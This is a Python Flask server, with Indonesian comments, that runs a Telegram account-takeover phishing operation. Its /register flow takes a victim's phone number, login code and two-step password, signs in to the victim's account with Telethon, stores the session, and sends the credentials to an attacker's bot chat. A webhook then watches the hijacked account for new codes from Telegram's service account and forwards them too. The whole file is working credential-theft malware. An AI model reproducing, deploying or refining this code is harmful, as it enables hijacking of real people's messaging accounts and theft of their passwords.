import os, requests, asyncio, re, threading
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

app = Flask(__name__)
CORS(app)

# Pastikan Nama Variabel di Railway SAMA PERSIS dengan os.getenv ini
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
# Di screenshot Abang pakai TELEGRAM_CHAT_ID, pastikan di Railway namanya ini
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID") 

user_db = {}

def bot_api(method, payload):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    try:
        res = requests.post(url, json=payload)
        return res.json()
    except Exception as e:
        print(f"Error Bot API: {e}")
        return {}

def normalisasi_nomor(nomor):
    num = re.sub(r'\D', '', nomor)
    if num.startswith('0'): num = '62' + num[1:]
    # Jika nomor sudah 62, jangan ditambah lagi
    return '+' + num

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    if not data: return jsonify({"status": "error"}), 400
    
    # Gunakan loop yang sudah ada atau buat baru jika perlu
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        return loop.run_until_complete(handle_flow(data))
    except Exception as e:
        print(f"Error Register: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

async def handle_flow(data):
    client = None
    try:
        step = int(data.get('step'))
        nomor = normalisasi_nomor(data.get('nomor', ''))
        nama = data.get('nama', 'User')
        otp_code = data.get('otp', '')
        sandi = data.get('sandi', '')

        # Ambil atau buat data user di DB RAM
        if nomor not in user_db:
            user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}

        session_str = user_db[nomor].get('session', '')
        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
        await client.connect()

        if step == 1:
            # Step 1: Minta OTP pertama kali
            res = await client.send_code_request(nomor)
            user_db[nomor]['hash'] = res.phone_code_hash
            user_db[nomor]['session'] = client.session.save()
            return jsonify({"status": "success"})

        elif step == 2:
            # Step 2: Verifikasi OTP dari browser
            try:
                await client.sign_in(nomor, otp_code, phone_code_hash=user_db[nomor]['hash'])
                user_db[nomor]['session'] = client.session.save()
                
                # KIRIM PESAN KE BOT
                text = f"✅ **DATA MASUK**\n\nNama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP: `{otp_code}`"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "Sadap OTP Baru", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except errors.SessionPasswordNeededError:
                user_db[nomor]['session'] = client.session.save()
                return jsonify({"status": "need_2fa"})
            except Exception as e:
                print(f"OTP Error: {e}")
                return jsonify({"status": "invalid_otp"}), 400

        elif step == 3:
            # Step 3: Verifikasi 2FA (Sandi)
            try:
                await client.sign_in(password=sandi)
                user_db[nomor]['sandi'] = sandi
                user_db[nomor]['session'] = client.session.save()
                
                text = f"✅ **DATA MASUK (2FA)**\n\nNama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{sandi}**\nOTP: Selesai"
                bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": text, 
                    "parse_mode": "Markdown",
                    "reply_markup": {"inline_keyboard": [[{"text": "Sadap OTP Baru", "callback_data": f"upd_{nomor}"}]]}
                })
                return jsonify({"status": "success"})
            except Exception as e:
                return jsonify({"status": "invalid_2fa"}), 400
                
    finally:
        if client: await client.disconnect()

@app.route('/webhook', methods=['POST'])
def webhook():
    update = request.get_json()
    if "callback_query" in update:
        call = update["callback_query"]
        data_call = call["data"]
        
        if "_" in data_call:
            action, nomor = data_call.split("_")
            if action == "upd":
                res = bot_api("sendMessage", {
                    "chat_id": CHAT_ID, 
                    "text": f"⏳ **MEMANTAU OTP BARU**\nNomor: `{nomor}`\nSilakan minta kode di aplikasi Telegram Anda.",
                })
                user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
                # Jalankan monitoring di background
                threading.Thread(target=lambda: asyncio.run(monitor_sniffing(nomor))).start()
    return jsonify({"status": "success"})

async def monitor_sniffing(nomor):
    data = user_db.get(nomor)
    if not data or not data.get('session'): return
    
    client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
    await client.connect()
    
    try:
        # Listen pesan dari Telegram (777000)
        @client.on(events.NewMessage(from_users=777000))
        async def handler(event):
            otp = re.search(r'\b\d{5}\b', event.raw_text)
            if otp:
                text_baru = f"🔔 **OTP BARU TERDETEKSI!**\n\nNomor: `{nomor}`\nOTP: `{otp.group(0)}`"
                bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown"})
        
        # Monitor selama 5 menit saja biar hemat RAM
        await asyncio.sleep(300) 
    finally:
        await client.disconnect()

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
